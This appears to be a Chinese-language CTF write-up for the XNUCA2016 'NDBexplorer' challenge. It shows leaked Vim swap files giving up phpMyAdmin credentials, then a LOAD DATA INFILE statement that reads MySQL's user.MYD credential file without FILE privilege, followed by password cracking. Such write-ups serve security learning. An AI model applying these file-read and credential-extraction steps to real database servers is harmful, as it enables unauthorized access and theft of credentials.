---
layout: post
title: XNUCA2016 NDBexplorer MySQL越权读取
comments: false
description: ""
keywords: "Vulnerability"
---

提示：a.SELECT @@datadir 。。。mysql/user.MYD b.user.MYD

题目：[Where is my data。](http://question7.erangelab.com/)

1、右键查看源码发现注释:

![20160809212520.jpg](/assets/images/2016-08-09/57832805.jpg)

2、发现使用的是Vim编辑器，可能存在缓存文件，格式如下：

```
/.db.php.swp
/.db.php.swo
/.db.php.swn
```

这里 **/.db.php.swp** 是缓存文件，下载发现了 phpmyadmin 的地址，账号以及密码；

![20160809212953.jpg](/assets/images/2016-08-09/1698047463.jpg)

```
<pre>
<span class="line"><span class="selector-tag">username</span>
<span class="selector-pseudo">:ctfdb</span>	
<span class="selector-tag">password</span>
<span class="selector-pseudo">:ctfmysql123</span></span></pre>
```

登录phpMyAdmin。

3、看Tips是提示的利用MySQL越权读取user.MYD的漏洞；

`select @@datadir;`

可以查到MySQL的数据文件的存放目录---MYD等那三类文件，查到路径是`/var/lib/mysql/`；

则user.MYD存在于此目录下的/mysql/user.MYD。

这里注意一点：linux和win的mysql存放数据的路径目录不一样，具体在文章后。

4、执行SQL语句：

```
LOAD DATA INFILE '/var/lib/mysql/mysql/user.MYD' INTO TABLE q fields terminated by 'LINES' TERMINATED BY '\0';
```

这句话是将user.MYD里的数据文字写到test库下面的q表里，执行；

![20160809214319.jpg](/assets/images/2016-08-09/3615450581.jpg)

注意：网上关于这个漏洞的利用语句是LOAD DATA LOCAL INFILE .....

多了一个LOCAL,这样在这个题目下是执行失败的，提示没有发现user.MYD；

具体原因记在文章末..

5、在时候打开test库下的q表，需要mysql用户密码就躺在里面了。

![20160809214600.jpg](/assets/images/2016-08-09/4107350408.jpg)

6、root和几个账号密码解不出来，但topsec能解；

密码：topsec123456 登录。

flag在ctfflag库的falg表文件里面躺着；

![20160809214902.jpg](/assets/images/2016-08-09/2116485969.jpg)

## Note

1、MySQL数据文件的存放路径和运行文件的路径（安装路径）：

Linux：

```
mysql&gt; SELECT @@datadir;
+-----------------+
| @@datadir |
+-----------------+
| /var/lib/mysql/ |
+-----------------+
1 row in set (0.00 sec)

mysql&gt; select @@basedir;
+-----------+
| @@basedir |
+-----------+
| /usr |
+-----------+
1 row in set (0.00 sec)
```

Windows:

```
mysql&gt; SELECT @@datadir;
+-------------------------------+
| @@datadir |
+-------------------------------+
| C:\websoft\mysql-5.6.17\data\ |
+-------------------------------+
1 row in set

mysql&gt; select @@basedir;
+-------------------------+
| @@basedir |
+-------------------------+
| C:\websoft\mysql-5.6.17 |
+-------------------------+
1 row in set
```

2、MySQL越权读取漏洞：

漏洞介绍：众所周知，Mysql的用户在没有File权限情况下是无法通过Load_file读文件或者通过into dumpfile 或者into outfile去写文件。偶尔发现个技巧，就是通过load data infile可以读取本地文件到数据库，这样就可以在低权限下去读取服务器上的文件。

但网上大多都是LOAD DATA LOCAL INFILE来写；

LOAD DATA LOCAL INFILE和LOAD DATA INFILE区别：[http://blog.csdn.net/youngerchen/article/details/7881678](http://blog.csdn.net/youngerchen/article/details/7881678)

